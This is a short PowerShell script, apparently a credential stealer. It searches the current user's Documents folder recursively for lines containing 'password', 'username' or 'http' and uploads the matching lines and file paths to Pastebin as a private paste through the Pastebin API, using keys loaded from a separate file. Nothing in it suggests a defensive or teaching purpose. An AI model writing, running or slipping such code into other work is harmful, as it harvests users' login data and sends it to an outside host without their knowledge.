. .\logindata.ps1
$Content = ConvertTo-Json (ls c:\users\$env:username\Documents -r | Select-String password,username,http | select line,path); $Title="pastebin3"
$Body = @{ api_dev_key=$DevKey; api_user_key=$UserKey; api_paste_name=$Title;api_paste_code=$Content;api_paste_private="2";api_option="paste";}
Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
